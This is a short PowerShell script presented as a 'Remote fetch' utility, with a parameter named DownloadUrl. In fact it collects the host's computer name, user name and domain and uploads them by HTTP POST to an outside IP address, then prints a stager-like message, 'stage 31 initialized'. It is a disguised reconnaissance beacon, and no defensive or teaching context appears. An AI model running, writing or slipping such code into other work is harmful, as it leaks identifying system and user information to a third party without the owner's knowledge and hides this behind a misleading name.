<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://198.51.100.120:8080/upload"
)
$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; UserName = $env:USERNAME; Domain = $env:USERDOMAIN }
Invoke-RestMethod -Uri $DownloadUrl -Method Post -Body ($ProfileData | ConvertTo-Json) -ContentType "application/json"
Write-Output "stage 31 initialized"
